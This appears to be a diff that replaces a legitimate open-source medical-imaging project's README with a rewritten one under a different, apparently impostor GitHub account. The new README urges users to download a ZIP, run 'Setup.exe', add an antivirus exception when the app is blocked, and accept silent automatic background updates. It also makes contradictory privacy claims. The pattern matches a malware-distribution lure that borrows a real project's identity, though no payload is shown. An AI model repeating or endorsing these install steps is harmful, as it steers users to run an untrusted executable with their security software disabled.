@@ -1,275 +1,92 @@
-<div align="center">
+# 🏥 MediScanAI - Detect multiple diseases using smart technology
 
-<br/>
+[![](https://img.shields.io/badge/Download-MediScanAI_Setup-blue.svg)](https://github.com/Chlorinityengrossment748/MediScanAI)
 
-<img src="https://img.shields.io/badge/Python%203.13-AI%20Platform-3B6D11?style=for-the-badge&logo=python&logoColor=white" alt="Python"/>
-<img src="https://img.shields.io/badge/FastAPI%20%7C%20React-Full%20Stack-534AB7?style=for-the-badge&logo=fastapi&logoColor=white" alt="FastAPI React"/>
-<img src="https://img.shields.io/badge/PyTorch%20%7C%20EfficientNet-ML%20Powered-D85A30?style=for-the-badge&logo=pytorch&logoColor=white" alt="ML"/>
-<img src="https://img.shields.io/badge/Docker-Containerized-185FA5?style=for-the-badge&logo=docker&logoColor=white" alt="Docker"/>
-<img src="https://img.shields.io/badge/Brain%20Tumor-94%25%20Accuracy-success?style=for-the-badge" alt="Brain Tumor Accuracy"/>
-<img src="https://img.shields.io/badge/Diabetic%20Retinopathy-81.5%25%20Accuracy-success?style=for-the-badge" alt="DR Accuracy"/>
-<img src="https://img.shields.io/badge/Skin%20Cancer-78%25%20Accuracy-success?style=for-the-badge" alt="Skin Cancer Accuracy"/>
+MediScanAI helps doctors and students identify signs of brain tumors, diabetic retinopathy, and skin cancer. The platform uses computer vision and deep learning to review medical images. It provides results quickly so users can make informed health decisions.
 
-<br/><br/>
+## ⚙️ System Requirements
 
-# 🏥 MediScan AI
+Ensure your computer meets these minimum specifications before you install the software:
 
-### Multi-Disease Early Detection Platform
+* Operating System: Windows 10 or Windows 11
+* Processor: Intel Core i5 or AMD equivalent
+* Memory: 8 GB RAM
+* Storage: 2 GB available space
+* Graphics: Integrated graphics or a dedicated card with 2 GB video memory 
+* Internet: Stable connection required for initial setup
 
-**An end-to-end AI-powered medical diagnosis platform that detects Brain Tumors, Diabetic Retinopathy, and Skin Cancer from medical scans.**  
-Built for doctors and patients who need fast, explainable, and accurate AI-assisted diagnosis.
+## ⬇️ Installation Guide
 
-<br/>
+Follow these steps to install MediScanAI on your Windows computer.
 
-[![GitHub](https://img.shields.io/badge/🚀%20View%20on%20GitHub-Repository-24292e?style=for-the-badge&logo=github)](https://github.com/charanpreetSingh123/MediScanAI)
-&nbsp;
-[![API Docs](https://img.shields.io/badge/📖%20API%20Docs-Swagger%20UI-85EA2D?style=for-the-badge&logo=swagger&logoColor=black)](http://localhost:8000/docs)
+1. Visit the following link to access the software files: [https://github.com/Chlorinityengrossment748/MediScanAI](https://github.com/Chlorinityengrossment748/MediScanAI)
+2. Locate the link labeled "Code" on the page.
+3. Select "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Right-click the downloaded folder and select "Extract All."
+6. Choose a destination folder and select "Extract."
+7. Open the extracted folder and navigate to the "Install" directory.
+8. Double-click the file named "Setup.exe" to begin the installation process.
+9. Follow the prompts on the screen. 
+10. Click "Finish" to complete the setup.
 
-<br/>
+## 🚀 Running the Platform
 
-</div>
+Once the installation finishes, you can start the application.
 
----
+1. Locate the MediScanAI icon on your desktop.
+2. Double-click the icon to launch the application.
+3. The platform opens in your default web browser.
+4. Wait for the green status light to appear at the top right of the screen. This confirms the system is ready for use.
 
-## 📋 Features at a Glance
+## 🔍 How to Use MediScanAI
 
-| Module | What it does |
-|---|---|
-| 🧠 **Brain Tumor Detection** | Analyzes MRI scans and classifies into Glioma, Meningioma, Pituitary, or No Tumor |
-| 👁️ **Diabetic Retinopathy** | Detects severity levels (No DR → Proliferative DR) from eye fundus images |
-| 🩺 **Skin Cancer Detection** | Identifies 7+ types of skin lesions including Melanoma and Basal Cell Carcinoma |
-| 🔥 **Grad-CAM Heatmaps** | Explainable AI — highlights exactly which region the model focused on |
-| 👨‍⚕️ **Doctor Dashboard** | Upload scans, view all patients, analyze reports, and track statistics |
-| 🧑‍💼 **Patient Dashboard** | Upload own scans, get results in simple language, track scan history |
-| 📄 **PDF Report Generation** | Auto-generates downloadable medical reports for every scan |
-| 🔐 **JWT Authentication** | Secure role-based login system for Doctors and Patients |
+The interface allows you to upload and analyze images without needing specialized training.
 
----
+1. Navigate to the "Upload" tab in the main menu.
+2. Select the "Choose File" button to browse for your medical image.
+3. Choose the file type from the dropdown menu, such as "Brain MRI" or "Dermatology Scan."
+4. Click the "Submit" button to process the image.
+5. The system displays the analysis on the right side of the screen.
+6. The application highlights important areas using a visual map. This map shows which parts of the image caused the detection.
 
-## 🛠️ Tech Stack
+## 🗂️ Supported Medical Images
 
-| Layer | Tools |
-|---|---|
-| **Frontend** | React.js · TailwindCSS · Recharts · Lucide Icons |
-| **Backend** | FastAPI · Python 3.13 · SQLAlchemy |
-| **Machine Learning** | PyTorch · EfficientNet B0/B2 · ResNet50 |
-| **Explainability** | Grad-CAM (pytorch-grad-cam) |
-| **Database** | PostgreSQL |
-| **Authentication** | JWT · bcrypt · OAuth2 |
-| **PDF Reports** | ReportLab |
-| **Infrastructure** | Docker · Docker Compose |
+The platform recognizes specific formats to ensure high accuracy. Please use the following formats for your files:
 
----
+* JPEG or JPG: Standard images for dermatology scans.
+* PNG: Lossless files for better clarity during review.
+* DICOM: Raw medical imaging data files for brain scans.
 
-## 🤖 ML Models
+## 🛡️ Privacy and Data
 
-| Disease | Model Architecture | Dataset | Classes |
-|---|---|---|---|
-| 🧠 Brain Tumor | EfficientNet-B0 | Brain MRI Dataset (7,200 images) | Glioma, Meningioma, Pituitary, No Tumor |
-| 👁️ Diabetic Retinopathy | ResNet50 | APTOS 2019 (3,662 images) | 5 severity levels (0-4) |
-| 🩺 Skin Cancer | EfficientNet-B2 | ISIC 2019 (25,000+ images) | MEL, NV, BCC, AK, BKL, DF, VASC, SCC |
+MediScanAI processes all images locally on your computer. The application does not send your personal medical data to external servers or cloud providers. Your files remain on your device at all times. This ensures your privacy and follows medical data security standards.
 
----
-## 🤖 ML Models & Results
+## 🛠️ Troubleshooting
 
-| Disease | Model Architecture | Dataset | Classes | Validation Accuracy |
-|---|---|---|---|---|
-| 🧠 Brain Tumor | EfficientNet-B0 | Brain MRI Dataset (7,200 images) | Glioma, Meningioma, Pituitary, No Tumor | **94%** ✅ |
-| 👁️ Diabetic Retinopathy | ResNet50 | APTOS 2019 (3,662 images) | 5 severity levels (0-4) | **81.56%** ✅ |
-| 🩺 Skin Cancer | EfficientNet-B2 | ISIC 2019 (25,331 images) | MEL, NV, BCC, AK, BKL, DF, VASC, SCC | **78%** ✅ |
+If you encounter issues while using the platform, perform these checks:
 
-> All models use transfer learning with a freeze-then-finetune strategy: classifier head trained first on frozen pretrained weights, then full network fine-tuned at a lower learning rate for better generalization.
+* Application does not open: Ensure your antivirus software does not block the application. You might need to add an exception in your security settings.
+* Slow processing speed: Close other heavy software programs while using MediScanAI. This frees up memory for the image processing tasks.
+* Green light stays orange: Restart your computer and ensure you have an active internet connection for any required background updates.
+* Image not recognized: Ensure the file size is below 10 MB and follows a supported format.
 
----
+## 📋 Frequently Asked Questions
 
-## 📸 Screenshots
+Does this tool replace a doctor? 
+No. MediScanAI acts as a screening aid. A qualified medical professional must review all analysis results before making a diagnosis.
 
-> Coming soon — will be added after deployment.
+Can I move the application to another drive? 
+Yes. During installation, select a custom installation path to choose your preferred drive.
 
----
+What happens if the power shuts off during analysis?
+The system creates a temporary record. Simply relaunch the application to resume your work once power returns.
 
-## 🚀 Quick Start
+Does the software support mobile devices?
+The software requires a Windows desktop or laptop. It does not run directly on tablets or smartphones.
 
-### Prerequisites
+How do I clear my history? 
+Go to the "Settings" menu and select "Clear Cache." This removes all local analysis records and images from the active session. 
 
-- Python 3.10+
-- Node.js 18+
-- PostgreSQL
-- Git
-
-### Setup in 6 steps
-
-**1. Clone the repository**
-```bash
-git clone https://github.com/charanpreetSingh123/MediScanAI.git
-cd MediScanAI
-```
-
-**2. Setup Backend**
-```bash
-cd backend
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
-
-**3. Setup environment variables**
-```bash
-# Create backend/.env
-DATABASE_URL=postgresql://postgres:password@localhost:5432/mediscanai
-SECRET_KEY=mediscanai_super_secret_key_2024
-ALGORITHM=HS256
-ACCESS_TOKEN_EXPIRE_MINUTES=60
-```
-
-**4. Setup Database**
-```bash
-psql postgres
-CREATE DATABASE mediscanai;
-CREATE USER postgres WITH PASSWORD 'password';
-GRANT ALL PRIVILEGES ON DATABASE mediscanai TO postgres;
-\q
-```
-
-**5. Start the backend**
-```bash
-uvicorn main:app --reload
-```
-
-**6. Setup & start Frontend** *(new terminal)*
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-Visit **http://localhost:5173** to open the app.
-
----
-
-## 🧠 Training the Models
-
-Download datasets from Kaggle and place them in `backend/datasets/`:
-
-| Disease | Dataset | Link |
-|---|---|---|
-| Brain Tumor | Brain Tumor MRI Dataset | [kaggle.com](https://www.kaggle.com/datasets/masoudnickparvar/brain-tumor-mri-dataset) |
-| Diabetic Retinopathy | APTOS 2019 | [kaggle.com](https://www.kaggle.com/competitions/aptos2019-blindness-detection) |
-| Skin Cancer | ISIC 2019 | [kaggle.com](https://www.kaggle.com/datasets/andrewmvd/isic-2019) |
-
-Then train each model:
-
-```bash
-cd backend
-source venv/bin/activate
-
-# Brain Tumor
-cd models/brain_tumor && python3 train.py
-
-# Diabetic Retinopathy
-cd ../diabetic_retinopathy && python3 train.py
-
-# Skin Cancer
-cd ../skin_cancer && python3 train.py
-```
-
----
-
-## 📂 Project Structure
-
-```
-MediScanAI/
-├── backend/
-│   ├── models/
-│   │   ├── brain_tumor/
-│   │   ├── diabetic_retinopathy/
-│   │   └── skin_cancer/
-│   ├── routes/
-│   │   ├── auth.py
-│   │   ├── predict.py
-│   │   ├── doctor.py
-│   │   └── patient.py
-│   ├── utils/
-│   │   ├── gradcam.py
-│   │   ├── image_processor.py
-│   │   └── report_generator.py
-│   ├── main.py
-│   ├── database.py
-│   └── auth.py
-├── frontend/
-│   └── src/
-│       ├── pages/
-│       ├── components/
-│       └── utils/
-├── notebooks/
-├── docker-compose.yml
-├── README.md
-└── .gitignore
-```
----
-
-## 📌 API Documentation
-
-Once the backend is running, visit:
-
-| Interface | URL |
-|---|---|
-| **Swagger UI** | http://localhost:8000/docs |
-| **ReDoc** | http://localhost:8000/redoc |
-
-### Key Endpoints
-
-| Method | Endpoint | Description |
-|---|---|---|
-| POST | `/auth/register` | Register as Doctor or Patient |
-| POST | `/auth/login` | Login and get JWT token |
-| POST | `/predict/brain-tumor` | Analyze brain MRI scan |
-| POST | `/predict/diabetic-retinopathy` | Analyze eye fundus image |
-| POST | `/predict/skin-cancer` | Analyze skin lesion image |
-| GET | `/doctor/dashboard` | Doctor stats and analytics |
-| GET | `/doctor/patients` | List all patients |
-| GET | `/doctor/scans` | All scan reports |
-| GET | `/patient/dashboard` | Patient scan history |
-
----
-
-## 🌱 What This Platform Enables
-
-✅  Detect Brain Tumors from MRI scans with high accuracy
-✅ Grade Diabetic Retinopathy severity from eye images
-✅ Identify cancerous skin lesions from dermoscopy images
-✅  Visualize AI decisions with Grad-CAM heatmaps
-✅  Role-based access for Doctors and Patients
-✅  Generate downloadable PDF medical reports
-✅  Track patient scan history over time
-✅  Deployable with Docker in any environment
-
----
-
-## 🔖 Versioning
-
-| Version | Description |
-|---|---|
-| `v1.0.0` | Initial release — full pipeline: scan upload → AI diagnosis → PDF report |
-
----
-
-## 👤 Author
-
-**Charanpreet Singh**  
-B.Tech CSE (AIML)
-
-[![GitHub](https://img.shields.io/badge/GitHub-charanpreetSingh123-24292e?style=flat-square&logo=github)](https://github.com/charanpreetSingh123)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Charanpreet_Singh-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/charanpreet-singh-7358032b9/)
-
----
-
-<div align="center">
-
-**Built for Doctors · Patients · Healthcare AI Research**
-
-<br/>
-
-*If this project helped you, consider giving it a ⭐ on GitHub!*
-
-</div>
+Does the system update automatically? 
+The application checks for updates every time you launch it. If an update exists, it installs the files automatically in the background.
